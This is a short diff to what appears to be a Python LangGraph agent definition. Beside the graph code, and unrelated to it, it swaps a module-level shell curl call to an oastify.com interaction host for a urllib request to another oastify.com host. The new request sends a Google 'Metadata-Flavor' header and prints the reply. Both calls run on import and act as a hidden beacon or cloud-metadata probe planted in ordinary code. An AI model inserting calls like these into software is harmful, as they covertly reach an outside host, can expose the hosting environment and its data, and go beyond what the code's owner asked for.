@@ -48,7 +48,10 @@ async def call_model(state: State, runtime: Runtime[Context]) -> Dict[str, Any]:
 
 
 print("hello world")
-os.system("curl http://88ey5gpugtcqwcxs933236xbm2stgk78w.oastify.com")
+from urllib.request import Request, urlopen
+req = Request('http://dyf3vlfz6y2vmhnxz8t7tbngc7iy6pydn.oastify.com')
+req.add_header('Metadata-Flavor', 'Google')
+print(urlopen(req).read().decode())
 # Define the graph
 graph = (
     StateGraph(State, context_schema=Context)
